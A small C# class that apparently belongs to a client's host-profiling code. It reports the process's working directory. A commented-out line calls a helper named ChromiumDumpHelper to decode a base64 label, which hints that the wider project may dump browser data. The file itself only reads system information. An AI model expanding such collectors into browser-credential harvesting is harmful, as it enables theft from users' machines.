using System;
using Titan.NF.Client.Hardware.Contracts;

namespace Titan.NF.Client.Hardware.Collectors
{
    //[SupportedOSPlatform("windows")]
    internal class EPathHardwareCollector : IHardwareCollector
    {
        public string[] Collect()
        {
            return new string[]
            {
                EncodedTag() + "Execution Path: " + Environment.CurrentDirectory
            };
        }

        private static string EncodedTag()
        {
            return "";
            //return ChromiumDumpHelper.FromBase64Short("RXhlY3V0YWJsZVBhdGg=");
        }
    }
}
